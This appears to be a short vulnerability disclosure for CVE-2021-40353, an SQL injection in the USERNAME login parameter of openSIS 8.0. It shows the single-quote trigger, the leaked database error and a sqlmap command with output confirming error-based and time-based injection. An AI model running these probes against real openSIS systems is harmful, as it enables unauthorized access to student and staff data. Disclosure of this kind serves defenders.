# CVE-2021-40353
CVE-2021-40353 openSIS 8.0 SQL Injection Vulnerability https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40353

A SQL injection vulnerability exists in version 8.0 of openSIS when MySQL or MariaDB  is used as the application database. An attacker can
then issue the SQL command through the USERNAME parameter.


Vulnerable PHP Page:

index.php - USERNAME parameter

Vulnerable Payload
' - will produce an error with database information
" - does not produce the error

Error

Date: 	

08/31/2021 03:16:22

Failure Notice: 	

 DB Execute Failed 

SQL: 	UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER('user1'')
Traceback: 	C:\xampp\htdocs\opensis\index.php at 502
Additional Information: 	You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''user1'')' at line 1
Date: 	

08/31/2021 03:16:22

	openSIS has encountered an error that could have resulted from any of the following:

    Invalid data input
    Database SQL error
    Program error

Please take this screen shot and send it to your openSIS representative for debugging and resolution. 




sqlmap -r post_opensis -p USERNAME

[09:38:19] [INFO] POST parameter 'USERNAME' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[09:38:19] [INFO] testing 'MySQL inline queries'
[09:38:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:38:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[09:38:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[09:38:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[09:38:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[09:38:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[09:38:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:38:46] [INFO] POST parameter 'USERNAME' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable




Discovered by Brian Lowe, August 2021
